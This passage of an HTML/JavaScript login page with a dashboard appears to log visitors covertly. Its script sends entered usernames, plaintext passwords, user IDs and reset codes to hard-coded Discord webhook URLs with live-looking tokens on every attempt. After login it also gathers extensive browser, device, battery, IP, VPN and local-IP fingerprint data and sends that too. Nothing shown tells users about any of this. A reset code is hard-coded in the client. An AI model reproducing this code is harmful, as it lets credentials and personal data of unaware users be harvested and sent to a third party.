            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          dashboard.showNotification('Login failed: Please fill all fields.', 'error');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User or User Identifier not found.');
          dashboard.showNotification('Login failed: User or User Identifier not found.', 'error');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          dashboard.showNotification('Login failed: Incorrect password.', 'error');
          return;
        }

        // Correct login
        attempts = 5;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';

        dashboard.showNotification(`Login successful for ${user.username}!`, 'success', 2000);

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Hide login, show Dashboard loading, then Dashboard
        loginBox.style.display = 'none';
        document.body.classList.remove('login-body'); // Remove login specific body style
        document.body.classList.add('dashboard-body'); // Add dashboard specific body style

        loadingOverlayDashboard.style.display = 'flex';
        await showLoadingScreen(loadingOverlayDashboard, 2000); // Display for 2 seconds

        document.getElementById('dashboard').style.display = 'block';
        
        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
        dashboard.showNotification('Dashboard loaded!', 'success');
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
          dashboard.showNotification('Max login attempts exceeded. Reset required.', 'error', 0); // Persistent error notification
        } else {
          if (attempts <= 3) {
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "🔔 Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJ_keyThIZ6gYCJILFSHfSDSnsq"; // Placeholder, check for validity
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB" // Placeholder
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip"; // Placeholder

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          dashboard.showNotification('Attempts counter reset successfully.', 'success');
        } else {
          dashboard.showNotification('Incorrect reset code. Try again.', 'error');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>
</body>
</html>
